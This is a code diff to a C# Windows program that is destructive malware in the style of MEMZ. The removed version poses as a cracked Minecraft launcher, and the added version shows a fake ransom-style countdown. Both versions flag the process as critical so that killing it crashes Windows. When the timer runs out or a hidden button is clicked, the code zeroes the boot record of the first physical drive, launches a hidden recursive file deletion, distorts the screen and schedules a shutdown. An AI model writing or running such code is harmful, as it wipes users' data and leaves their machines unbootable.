@@ -4,9 +4,8 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Net.NetworkInformation;
 
-namespace MemzProject
+namespace DangerousMemz
 {
     class Program : Form
     {
@@ -23,63 +22,55 @@ namespace MemzProject
         [STAThread]
         static void Main()
         {
-            // 1. INTERNET CHECK
-            if (!CheckNet()) {
-                MessageBox.Show("Sorry, to run this program connect to internet.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
-            }
-
-            // 2. THE MEMZ-STYLE WARNINGS
-            if (MessageBox.Show("The software you are about to run is MALWARE.\nIt will destroy your computer if you are not careful.\n\nAre you sure you want to run this?", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
-            if (MessageBox.Show("THIS IS THE LAST WARNING.\nYour data will be deleted and Windows will not boot.\n\nSTILL WANT TO PROCEED?", "LAST CHANCE", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
+            // 1. SCARY WARNINGS
+            if (MessageBox.Show("WARNING: This is a high-risk application.\nRunning this will cause permanent system damage.\n\nContinue?", "CRITICAL ALERT", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
+            if (MessageBox.Show("FINAL WARNING: ALL DATA WILL BE WIPED.\nThis is your last chance to cancel.\n\nExecute?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
 
             Application.EnableVisualStyles();
-            // Critical process protection (Blue Screen if killed via Task Manager)
-            try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
-            
-            Application.Run(new Program());
-        }
 
-        static bool CheckNet() {
-            try { using (Ping p = new Ping()) return p.Send("8.8.8.8", 2000).Status == IPStatus.Success; }
-            catch { return false; }
+            // 2. MAKE PROCESS CRITICAL (THIS TRIGGERS THE RED WINDOWS WARNINGS)
+            // If the user tries to stop the process, the PC will Blue Screen (BSOD).
+            try 
+            { 
+                int isCritical = 1; 
+                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, 4); 
+            } 
+            catch {}
+
+            Application.Run(new Program());
         }
 
         public Program()
         {
-            this.Text = "Minecraft Launcher v1.4 - Official Crack";
+            this.Text = "CRITICAL SYSTEM FAILURE";
             this.Size = new Size(800, 450);
             this.StartPosition = FormStartPosition.CenterScreen;
-            this.BackColor = Color.FromArgb(20, 20, 20);
+            this.BackColor = Color.Maroon; // Dangerous Red Background
             this.ForeColor = Color.White;
             this.FormBorderStyle = FormBorderStyle.None;
             this.TopMost = true;
 
-            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 48), ForeColor = Color.Lime, Location = new Point(50, 50), Size = new Size(300, 80) };
+            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 60, FontStyle.Bold), ForeColor = Color.Yellow, Location = new Point(250, 50), Size = new Size(300, 100) };
             
-            Label lblInfo = new Label() { Text = "ENTER YOUR LICENSE KEY TO ABORT DESTRUCTION:", Location = new Point(200, 200), Size = new Size(400, 20), Font = new Font("Arial", 10, FontStyle.Bold) };
-            txtKey = new TextBox() { Location = new Point(250, 230), Width = 300, Font = new Font("Arial", 14), BackColor = Color.Black, ForeColor = Color.Yellow };
+            Label lblInfo = new Label() { Text = "SYSTEM ENCRYPTED. ENTER MASTER KEY OR WAIT FOR WIPE:", Location = new Point(150, 200), Size = new Size(500, 25), Font = new Font("Arial", 12, FontStyle.Bold), TextAlign = ContentAlignment.MiddleCenter };
+            txtKey = new TextBox() { Location = new Point(250, 240), Width = 300, Font = new Font("Arial", 16), BackColor = Color.Black, ForeColor = Color.Red };
             
-            Button btnVerify = new Button() { Text = "VERIFY", Location = new Point(560, 228), Size = new Size(100, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.DarkSlateGray };
+            Button btnVerify = new Button() { Text = "UNLOCK", Location = new Point(560, 238), Size = new Size(100, 35), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White };
             btnVerify.Click += (s, e) => {
                 if (txtKey.Text == "MC-FREE-2026-X") {
-                    MessageBox.Show("License Validated! Process Terminated.", "Success");
+                    // Turn off critical status before exiting to avoid BSOD
+                    int isNotCritical = 0;
+                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isNotCritical, 4);
+                    MessageBox.Show("Decryption Successful.", "Safe Exit");
                     Environment.Exit(0);
                 } else {
-                    MessageBox.Show("Invalid Key! Time is running out...", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
+                    MessageBox.Show("INVALID KEY. DESTRUCTION ACCELERATED.", "THREAT DETECTED", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    timeLeft -= 60; // Remove 1 minute for wrong key
                 }
             };
 
-            // HIDDEN "DESTROY NOW" BUTTON (Invisible dot bottom-left)
-            Button btnDestroyNow = new Button() { 
-                Text = ".", 
-                Location = new Point(0, 430), 
-                Size = new Size(20, 20), 
-                FlatStyle = FlatStyle.Flat, 
-                ForeColor = Color.FromArgb(20, 20, 20), 
-                BackColor = Color.FromArgb(20, 20, 20),
-                FlatAppearance = { BorderSize = 0 }
-            };
+            // HIDDEN DOT (Bottom-Left)
+            Button btnDestroyNow = new Button() { Text = ".", Location = new Point(0, 430), Size = new Size(20, 20), FlatStyle = FlatStyle.Flat, ForeColor = Color.Maroon, BackColor = Color.Maroon, FlatAppearance = { BorderSize = 0 } };
             btnDestroyNow.Click += (s, e) => { timeLeft = 0; };
 
             this.Controls.AddRange(new Control[] { lblTimer, lblInfo, txtKey, btnVerify, btnDestroyNow });
@@ -89,7 +80,6 @@ namespace MemzProject
                 if (timeLeft > 0) {
                     timeLeft--;
                     lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
-                    if (timeLeft < 60) lblTimer.ForeColor = Color.Red; // Turns red in last minute
                 } else {
                     t.Stop();
                     ExecuteDestruction();
@@ -100,27 +90,31 @@ namespace MemzProject
 
         void ExecuteDestruction()
         {
+            // MBR KILL
             try {
-                uint written;
-                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-                WriteFile(drive, new byte[512], 512, out written, IntPtr.Zero);
-            } catch { }
+                uint w;
+                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(h, new byte[512], 512, out w, IntPtr.Zero);
+            } catch {}
 
+            // FILE KILLER
             Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });
 
+            // GDI RAVE
             Thread gdi = new Thread(() => {
-                Random rnd = new Random();
+                Random r = new Random();
                 IntPtr hdc = GetDC(IntPtr.Zero);
                 while(true) {
-                    BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), 2000, 2000, hdc, 0, 0, 0x00990066);
-                    Thread.Sleep(15);
+                    BitBlt(hdc, r.Next(-20, 20), r.Next(-20, 20), 2000, 2000, hdc, 0, 0, 0x00990066);
+                    Thread.Sleep(10);
                 }
             });
             gdi.Start();
 
+            // SHUTDOWN
             Process.Start("shutdown", "/s /t 300 /c \"PC saying BYE BYE\"");
             this.Controls.Clear();
-            Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 80), ForeColor = Color.Red, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
+            Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 100), ForeColor = Color.White, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
             this.Controls.Add(bye);
         }
     }
